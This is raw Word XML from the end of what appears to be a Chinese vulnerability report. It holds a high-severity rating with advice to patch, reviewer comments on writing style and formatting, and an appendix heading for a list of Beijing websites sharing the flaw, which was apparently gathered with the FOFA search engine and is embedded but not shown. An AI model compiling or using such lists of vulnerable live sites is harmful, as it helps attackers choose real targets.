            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:delText>评价</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="38DEE0C0" w14:textId="350190B0" w:rsidR="00422B7D" w:rsidRDefault="000A184D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="微软雅黑"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:pPrChange w:id="554" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="555" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>此</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>漏洞等级为高，利用难度低，威胁程度高，影响面高。建议使用用户及时安装最新补丁，以免遭受黑客攻击</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="微软雅黑" w:hint="eastAsia"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596106A2" w14:textId="7418551B" w:rsidR="00422B7D" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:pPrChange w:id="556" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="557" w:name="_Toc45275610"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>附件：北京市拥有相似漏洞的网站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列表</w:t>
      </w:r>
      <w:bookmarkEnd w:id="557"/>
      <w:del w:id="558" w:author="芮志清" w:date="2020-07-10T11:40:00Z">
        <w:r w:rsidDel="006D551D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:delText>（来自</w:delText>
        </w:r>
        <w:r w:rsidDel="006D551D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:delText>F</w:delText>
        </w:r>
        <w:r w:rsidDel="006D551D">
          <w:rPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:delText>OFA</w:delText>
        </w:r>
        <w:r w:rsidDel="006D551D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:delText>）</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7A48495E" w14:textId="6568AD0E" w:rsidR="00422B7D" w:rsidRPr="00935855" w:rsidRDefault="00B92280" w:rsidP="00422B7D">
      <w:r>
        <w:object w:dxaOrig="1155" w:dyaOrig="747" w14:anchorId="2BC3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5pt;height:37.4pt" o:ole="">
            <v:imagedata r:id="rId18" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1655889081" r:id="rId19"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EA2766" w14:textId="308F4410" w:rsidR="00BD7184" w:rsidRPr="00422B7D" w:rsidRDefault="00BD7184" w:rsidP="00422B7D"/>
    <w:sectPr w:rsidR="00BD7184" w:rsidRPr="00422B7D" w:rsidSect="00935855">
      <w:headerReference w:type="default" r:id="rId20"/>
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
      <w:cols w:space="720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芮志清" w:date="2020-07-10T12:13:00Z" w:initials="芮志清">
    <w:p w14:paraId="22C45EE7" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A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写文档注意的几个问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49654DE0" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语言采用书面语言，避免口语化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EC1350" w14:textId="4DEA079D" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对于内容的介绍要从浅到深，注重内容连贯。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695FD1D8" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>确定受众：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B094670" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>面向非专业人士：多加图形化界面的截图，把简单的内容排列到前面，对于较难的知识前加铺垫。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE2ECCC" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine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面向专业人士：多加代码公式，进行更深层次的原理分析。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652CCA62" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="714A1433" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>格式问题：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF3662F" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>文章格式是门面，所以一定需要注意。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A5975F" w14:textId="52008E56" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="7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首页，大字注明标题，单位，时间等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7614818F" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="7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加目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1039B021" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一般情况下标题采用黑体，正文用宋体，英文使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00D972A6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Times New Roman</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602F17AF" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="7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段首空两格。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247CEF80" w14:textId="77777777" w:rsidR="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="7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图片加题注，简明而又准确注明图片所能表达的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C628E4" w14:textId="58604387" w:rsidR="00D972A6" w:rsidRPr="00D972A6" w:rsidRDefault="00D972A6" w:rsidP="00D972A6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:ind w:firstLine="7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文章的格式，字体大小，风格保持一致</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="139" w:author="芮志清" w:date="2020-07-10T11:51:00Z" w:initials="芮志清">
    <w:p w14:paraId="6FA84F86" w14:textId="2288308F" w:rsidR="008C5718" w:rsidRDefault="008C5718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图片居中对齐，调整大小，设置题注。</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="175" w:author="芮志清" w:date="2020-07-10T11:45:00Z" w:initials="芮志清">
    <w:p w14:paraId="5E7A4F0C" w14:textId="4627C72E" w:rsidR="00EA14FB" w:rsidRDefault="00C869E0">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="174" w:author="芮志清" w:date="2020-07-10T11:46:00Z" w:initials="芮志清">
    <w:p w14:paraId="186E43E9" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB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“首先</w:t>
      </w:r>
      <w:r w:rsidRPr="00EA14FB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>下载</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>VMware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49079628" w14:textId="592FF977" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB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这种文档里尽量避免口语化的词。</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="189" w:author="芮志清" w:date="2020-07-10T11:40:00Z" w:initials="芮志清">
    <w:p w14:paraId="56056DA1" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB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图片尽量别带明显水印。</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="210" w:author="芮志清" w:date="2020-07-10T11:49:00Z" w:initials="芮志清">
    <w:p w14:paraId="528F4A53" w14:textId="0A0496CA" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>文档中同一个专有名词的大小写保持一致</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="212" w:author="芮志清" w:date="2020-07-10T11:48:00Z" w:initials="芮志清">
    <w:p w14:paraId="27B2674D" w14:textId="5BCFF890" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="af3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="421" w:author="芮志清" w:date="2020-07-10T11:40:00Z" w:initials="芮志清">
    <w:p w14:paraId="7CCA989A" w14:textId="0C434B96" w:rsidR="006D551D" w:rsidRDefault="006D551D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图片尽量别带明显水印。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C628E4" w15:done="0"/>
  <w15:commentEx w15:paraId="6FA84F86" w15:done="0"/>
  <w15:commentEx w15:paraId="5E7A4F0C" w15:done="0"/>
  <w15:commentEx w15:paraId="49079628" w15:done="0"/>
  <w15:commentEx w15:paraId="56056DA1" w15:done="0"/>
  <w15:commentEx w15:paraId="528F4A53" w15:done="0"/>
  <w15:commentEx w15:paraId="27B2674D" w15:done="0"/>
  <w15:commentEx w15:paraId="7CCA98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2D9F3" w16cex:dateUtc="2020-07-10T04:13:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D4A6" w16cex:dateUtc="2020-07-10T03:51:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D34E" w16cex:dateUtc="2020-07-10T03:45:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D38F" w16cex:dateUtc="2020-07-10T03:46:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D33E" w16cex:dateUtc="2020-07-10T03:40:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D438" w16cex:dateUtc="2020-07-10T03:49:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D416" w16cex:dateUtc="2020-07-10T03:48:00Z"/>
  <w16cex:commentExtensible w16cex:durableId="22B2D227" w16cex:dateUtc="2020-07-10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C628E4" w16cid:durableId="22B2D9F3"/>
  <w16cid:commentId w16cid:paraId="6FA84F86" w16cid:durableId="22B2D4A6"/>
  <w16cid:commentId w16cid:paraId="5E7A4F0C" w16cid:durableId="22B2D34E"/>
  <w16cid:commentId w16cid:paraId="49079628" w16cid:durableId="22B2D38F"/>
  <w16cid:commentId w16cid:paraId="56056DA1" w16cid:durableId="22B2D33E"/>
  <w16cid:commentId w16cid:paraId="528F4A53" w16cid:durableId="22B2D438"/>
  <w16cid:commentId w16cid:paraId="27B2674D" w16cid:durableId="22B2D416"/>
  <w16cid:commentId w16cid:paraId="7CCA989A" w16cid:durableId="22B2D2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96AFC" w14:textId="77777777" w:rsidR="005D165F" w:rsidRDefault="005D165F" w:rsidP="00383C21">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="71C8B087" w14:textId="77777777" w:rsidR="005D165F" w:rsidRDefault="005D165F" w:rsidP="00383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DEE9" w14:textId="77777777" w:rsidR="005D165F" w:rsidRDefault="005D165F" w:rsidP="00383C21">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3F8C897F" w14:textId="77777777" w:rsidR="005D165F" w:rsidRDefault="005D165F" w:rsidP="00383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E47ED" w14:textId="77777777" w:rsidR="00935855" w:rsidRDefault="00DE1B0A" w:rsidP="00935855">
    <w:pPr>
      <w:pStyle w:val="a6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fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> TITLE 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40389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818E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750361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C7C58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C2A4D4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E2E36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0F27B3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389D8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5F89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21E0E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2B0D0C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B386ACA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C200270"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B15499DC"/>
    <w:lvl w:ilvl="0" w:tplc="7B226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芮志清">
    <w15:presenceInfo w15:providerId="None" w15:userId="芮志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DA"/>
    <w:rsid w:val="0008784A"/>
    <w:rsid w:val="000A03DA"/>
    <w:rsid w:val="000A184D"/>
    <w:rsid w:val="000B09BE"/>
    <w:rsid w:val="00131B2E"/>
    <w:rsid w:val="00165CC4"/>
    <w:rsid w:val="002A57FE"/>
    <w:rsid w:val="002F059C"/>
    <w:rsid w:val="002F071F"/>
    <w:rsid w:val="00303B80"/>
    <w:rsid w:val="0032369E"/>
    <w:rsid w:val="00383C21"/>
    <w:rsid w:val="00385BA9"/>
    <w:rsid w:val="00422B7D"/>
    <w:rsid w:val="00422BB9"/>
    <w:rsid w:val="0051050A"/>
    <w:rsid w:val="00581535"/>
    <w:rsid w:val="005D165F"/>
    <w:rsid w:val="00600008"/>
    <w:rsid w:val="00647309"/>
    <w:rsid w:val="00690321"/>
    <w:rsid w:val="006B0CBA"/>
    <w:rsid w:val="006B2D85"/>
    <w:rsid w:val="006D551D"/>
    <w:rsid w:val="0077412D"/>
    <w:rsid w:val="00781779"/>
    <w:rsid w:val="00793994"/>
    <w:rsid w:val="007B163A"/>
    <w:rsid w:val="007B4464"/>
    <w:rsid w:val="008C5718"/>
    <w:rsid w:val="00951D0B"/>
    <w:rsid w:val="00981F9B"/>
    <w:rsid w:val="009D6E05"/>
    <w:rsid w:val="009E60CA"/>
    <w:rsid w:val="00A17595"/>
    <w:rsid w:val="00A1781C"/>
    <w:rsid w:val="00A24358"/>
    <w:rsid w:val="00A70612"/>
    <w:rsid w:val="00A9113B"/>
    <w:rsid w:val="00A94BC8"/>
    <w:rsid w:val="00AC1DB1"/>
    <w:rsid w:val="00B92280"/>
    <w:rsid w:val="00BA1949"/>
    <w:rsid w:val="00BD7184"/>
    <w:rsid w:val="00C869E0"/>
    <w:rsid w:val="00CC634D"/>
    <w:rsid w:val="00CD2629"/>
    <w:rsid w:val="00CD5413"/>
    <w:rsid w:val="00CF14EF"/>
    <w:rsid w:val="00CF72CA"/>
    <w:rsid w:val="00D137CA"/>
    <w:rsid w:val="00D972A6"/>
    <w:rsid w:val="00DE1B0A"/>
    <w:rsid w:val="00DE3635"/>
    <w:rsid w:val="00E24169"/>
    <w:rsid w:val="00EA14FB"/>
    <w:rsid w:val="00EE36C4"/>
    <w:rsid w:val="00F3414D"/>
    <w:rsid w:val="00F44F41"/>
    <w:rsid w:val="00F632FE"/>
    <w:rsid w:val="00FA7165"/>
    <w:rsid w:val="00FE1BC7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D8292"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{075CD898-9D79-4C80-A664-296B9A66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280"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr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422B7D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22B7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22B7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B7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4">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002F07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071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83C21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383C21"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a8">
    <w:name w:val="footer"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="a9"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00383C2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383C21"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="10">
    <w:name w:val="标题 1 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00422B7D"/>
    <w:rPr>
      <w:rFonts w:eastAsia="黑体"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="44"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="30"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="20">
    <w:name w:val="标题 2 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00422B7D"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="黑体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22B7D"/>
    <w:rPr>
      <w:rFonts w:eastAsia="黑体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22B7D"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="黑体" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:kern w:val="2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="aa">
    <w:name w:val="Title"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:link w:val="ab"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="00422B7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b">
    <w:name w:val="标题 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="aa"/>
    <w:uiPriority w:val="10"/>
    <w:rsid w:val="00422B7D"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="黑体" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi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2B7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2B7D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00422B7D"/>
    <w:pPr>
      <w:ind w:leftChars="200" w:left="420"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ac">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="ad"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00B92280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B92280"/>
    <w:rPr>
      <w:kern w:val="2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ae">
    <w:name w:val="Body Text First Indent"/>
    <w:basedOn w:val="ac"/>
    <w:link w:val="af"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00B92280"/>
    <w:pPr>
      <w:ind w:firstLineChars="100" w:firstLine="420"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="af">
    <w:name w:val="正文文本首行缩进 字符"/>
    <w:basedOn w:val="ad"/>
    <w:link w:val="ae"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00B92280"/>
    <w:rPr>
      <w:kern w:val="2"/>
      <w:sz w:val="24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B92280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92280"/>
    <w:rPr>
      <w:kern w:val="2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6D551D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D551D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6D551D"/>
    <w:rPr>
      <w:kern w:val="2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="21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D551D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D551D"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af7">
    <w:name w:val="caption"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="008C57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hua</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>芮志清</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-07-10T04:25:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-07-10T04:25:00Z</dcterms:modified>
</cp:coreProperties>
</file>